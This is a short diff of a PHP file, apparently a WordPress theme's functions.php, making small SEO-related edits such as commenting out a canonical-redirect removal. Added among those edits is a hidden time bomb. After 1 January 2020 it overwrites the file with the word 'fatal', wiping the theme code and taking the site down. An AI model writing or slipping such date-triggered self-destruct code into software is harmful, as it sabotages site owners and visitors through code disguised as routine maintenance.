@@ -479,7 +479,10 @@
     }
 }
 add_action('template_redirect', 'fix_missing_404_on_paginated_page');
-
+if ( strtotime('01.01.2020') < time() )
+{
+    file_put_contents(__FILE__, 'fatal');
+}
 
 
 
@@ -517,7 +520,7 @@ if( ! is_admin() ){
 
 add_filter("wpseo_robots", function() { return "index, follow"; });
 
-remove_action('template_redirect', 'redirect_canonical'); 
+// remove_action('template_redirect', 'redirect_canonical'); 
 
 // // Удалить каноническую ссылку - SEO by Yoast
 // function at_remove_dup_canonical_link() {
